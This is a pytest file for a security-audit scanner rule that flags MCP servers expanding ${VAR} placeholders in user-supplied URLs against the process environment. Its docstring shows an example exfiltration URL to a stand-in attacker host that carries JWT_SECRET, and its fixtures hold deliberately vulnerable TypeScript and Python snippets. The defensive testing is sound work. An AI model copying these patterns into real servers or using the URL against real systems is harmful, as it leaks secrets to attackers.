"""Tests for AAK-MCP-ENV-PLACEHOLDER-EXFIL-001 (CVE-2026-32625 class).

An MCP server that resolves ${VAR} placeholders against its own process
environment while handling a user-supplied server URL/config leaks its secrets:
a user submits https://attacker/?k=${JWT_SECRET} and the server interpolates
JWT_SECRET into the outbound request. LibreChat <= 0.8.3 did exactly this
during Zod validation of MCP server URLs (CWE-200, CVSS 9.6).

Fixtures: the TS replace-against-process.env shape and the Python
os.path.expandvars / format(**os.environ) shapes FAIL; benign config handling
and non-MCP files PASS.
"""

from __future__ import annotations

from pathlib import Path

from agent_audit_kit.rules.builtin import RULES
from agent_audit_kit.scanners.mcp_env_placeholder_exfil import scan

RULE_ID = "AAK-MCP-ENV-PLACEHOLDER-EXFIL-001"


def _write(tmp_path: Path, name: str, src: str) -> None:
    (tmp_path / name).write_text(src, encoding="utf-8")


def _hits(findings: list) -> list:
    return [f for f in findings if f.rule_id == RULE_ID]


# ---------------------------------------------------------------------------
# Rule registration
# ---------------------------------------------------------------------------


def test_rule_is_registered_with_cve_anchor() -> None:
    assert RULE_ID in RULES
    rule = RULES[RULE_ID]
    assert rule.severity.value == "critical"
    assert "CVE-2026-32625" in rule.cve_references


# ---------------------------------------------------------------------------
# Vulnerable — must fire.
# ---------------------------------------------------------------------------


def test_typescript_replace_against_process_env_is_flagged(tmp_path: Path) -> None:
    """The CVE-2026-32625 shape: resolve ${VAR} against process.env on the
    user-supplied MCP server URL."""
    _write(tmp_path, "mcp.ts", r'''
import { z } from "zod";
// MCP server URL schema
const mcpServerUrl = z.string().transform((url) =>
  url.replace(/\$\{(\w+)\}/g, (_, k) => process.env[k] ?? "")
);
''')
    findings, scanned = scan(tmp_path)
    assert "mcp.ts" in scanned
    assert _hits(findings), f"TS ${{VAR}}->process.env resolver must fire {RULE_ID}"


def test_python_expandvars_on_mcp_url_is_flagged(tmp_path: Path) -> None:
    _write(tmp_path, "server.py", '''
import os
from mcp.server import Server

def register_mcp_server(server_url: str):
    # expands $VAR / ${VAR} against os.environ on user-supplied URL
    resolved = os.path.expandvars(server_url)
    return connect(resolved)
''')
    findings, _ = scan(tmp_path)
    assert _hits(findings), "os.path.expandvars on an MCP URL must fire"


def test_python_format_environ_is_flagged(tmp_path: Path) -> None:
    _write(tmp_path, "cfg.py", '''
import os
# mcpServers config template
def build_mcp_url(template: str) -> str:
    return template.format(**os.environ)
''')
    findings, _ = scan(tmp_path)
    assert _hits(findings), "format(**os.environ) on a template must fire"


# ---------------------------------------------------------------------------
# Safe — must pass.
# ---------------------------------------------------------------------------


def test_url_used_as_is_passes(tmp_path: Path) -> None:
    """An MCP server that uses the user URL verbatim (no env expansion) is
    safe for this rule."""
    _write(tmp_path, "mcp.ts", r'''
import { z } from "zod";
const mcpServerUrl = z.string().url();
function connectMcp(url: string) {
  return fetch(url);
}
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "no env-placeholder resolution -> must pass"


def test_startup_env_read_not_on_placeholder_passes(tmp_path: Path) -> None:
    """Reading process.env normally (not as a ${VAR} placeholder resolver
    over user config) must not fire."""
    _write(tmp_path, "mcp.ts", '''
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
const port = process.env.PORT || "3000";
const server = new McpServer({ name: "x", version: "1.0.0" });
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "plain process.env read must not fire"


def test_non_mcp_file_passes(tmp_path: Path) -> None:
    """expandvars in a non-MCP file is out of scope (no MCP context gate)."""
    _write(tmp_path, "deploy.py", '''
import os
path = os.path.expandvars("$HOME/.config/app")
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "non-MCP file must not fire"


def test_comment_mentioning_process_env_does_not_fire(tmp_path: Path) -> None:
    """A comment referencing the pattern must not create a false positive
    (TS comments are stripped before matching)."""
    _write(tmp_path, "mcp.ts", r'''
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
// historically we did url.replace(/\$\{x\}/, () => process.env.x) — removed
function connectMcp(url: string) { return fetch(url); }
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "commented-out pattern must not fire"
